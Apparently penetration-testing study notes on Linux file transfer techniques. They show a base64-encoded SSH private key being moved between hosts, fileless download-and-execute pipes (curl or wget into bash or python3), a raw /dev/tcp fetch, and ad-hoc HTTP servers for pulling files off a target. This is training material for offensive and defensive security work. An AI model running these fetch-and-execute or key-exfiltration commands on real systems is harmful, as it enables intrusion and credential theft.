
# Linux File Transfer Methods

## Introduction

Linux offers a variety of tools for file transfer operations, which can be exploited by attackers or used by defenders to monitor and prevent malicious activities. Understanding these methods enhances skills in network attack and defense.

---

## Real-World Example

During incident response on web servers, threat actors exploited multiple download methods—cURL, wget, and Python—to fetch malware via HTTP. Malware often uses HTTP/HTTPS for communication across platforms.

---

## Download Operations

### Base64 Encoding / Decoding

For small files, encoding in Base64 allows transfer via command-line without network communication.

**Check MD5 hash of source file:**

```bash
LeDaav@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278
```


**Encode file to Base64:**

```bash
bash

LeDaav@htb[/htb]$ cat id_rsa | base64 -w 0; echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

**Decode in Linux:**

```bash
bash

echo -n '<base64 string>' | base64 -d > id_rsa
```

**Verify MD5 hash:**

```bash
bash

md5sum id_rsa
4e301756a07ded0a2dd6953abf015278
```

---

## Web-Based File Transfers

### Using wget and curl

**Download a file with wget:**

```bash
bash

wget https://example.com/file.sh -O /tmp/file.sh
```

**Download a file with curl:**

```bash
bash

curl -o /tmp/file.sh https://example.com/file.sh
```

---

## Fileless Attacks with Linux

Linux allows executing commands directly via pipes, enabling fileless operations.

**Example: Download and execute a script directly:**

```bash
bash

curl https://example.com/script.sh | bash
```

**Using wget:**

```bash
bash

wget -qO- https://example.com/script.py | python3
```

**Using /dev/tcp for raw connection:**

```bash
bash

exec 3<>/dev/tcp/192.168.1.10/80
echo -e "GET /script.sh HTTP/1.1\n\n" >&3
cat <&3
```

---

## SSH and SCP

### Setting Up SSH Server

```bash
bash

sudo systemctl enable ssh
sudo systemctl start ssh
```

### Download Files with SCP

```bash
bash

scp user@192.168.1.100:/path/to/file /local/destination/
```

### Upload Files with SCP

```bash
bash

scp /local/file user@192.168.1.100:/path/to/destination/
```

---

## Web Server for File Transfer

### Using Python HTTP Server

**Python 3:**

```bash
bash

python3 -m http.server 8000
```

**Python 2.7:**

```bash
bash

python2.7 -m SimpleHTTPServer 8000
```

**PHP:**

```bash
bash

php -S 0.0.0.0:8000
```

**Ruby:**

```bash
bash

ruby -run -ehttpd . -p8000
```

### Download Files from Target

```bash
bash

wget http://<target_ip>:8000/file.txt
```